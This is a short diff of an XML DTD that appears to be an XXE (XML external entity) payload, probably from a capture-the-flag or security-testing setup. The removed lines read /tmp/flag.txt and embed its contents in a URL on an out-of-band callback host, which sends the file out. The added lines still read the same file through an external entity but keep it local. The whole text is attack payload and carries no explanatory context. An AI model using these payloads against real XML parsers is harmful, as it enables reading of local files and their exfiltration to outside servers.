@@ -1,4 +1,3 @@
-<!ENTITY % config_hex SYSTEM "file:///tmp/flag.txt">
-<!ENTITY exfiltrate SYSTEM "http://exfil.%config_hex;.zmjuwyodyesoodtaz3c6990ax72.oast.fun/">
-<!ENTITY % config SYSTEM "file:///tmp/xml/config.dtd">
+<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
+<!ENTITY % config "<!ENTITY exfiltrate '%file;'>">
 %config;
